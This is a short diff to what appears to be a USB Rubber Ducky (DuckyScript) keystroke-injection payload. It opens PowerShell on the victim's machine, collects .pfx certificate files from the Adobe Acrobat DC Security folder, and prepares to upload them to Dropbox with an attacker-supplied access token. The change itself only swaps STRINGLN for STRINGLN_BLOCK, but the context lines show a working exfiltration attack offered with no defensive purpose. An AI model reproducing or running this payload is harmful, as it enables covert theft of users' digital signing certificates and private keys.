@@ -24,7 +24,7 @@ STRING PowerShell
 DELAY 2000
 
 REM Settings about Adobe Reader
-STRINGLN
+STRINGLN_BLOCK
     $roamingFolderPath = [Environment]::GetFolderPath('ApplicationData')
     $securityFolderPath = Join-Path -Path $roamingFolderPath -ChildPath 'Adobe\Acrobat\DC\Security'
     $pfxFiles = Get-ChildItem -Path $securityFolderPath -Filter '*.pfx' -File
@@ -36,7 +36,7 @@ STRING DROPBOX_ACCESS_TOKEN
 STRING "
 ENTER
 
-STRINGLN
+STRINGLN_BLOCK
     $authHeader = @{Authorization = "Bearer $accessToken"}
 
     $uploadUrl = "https://content.dropboxapi.com/2/files/upload"
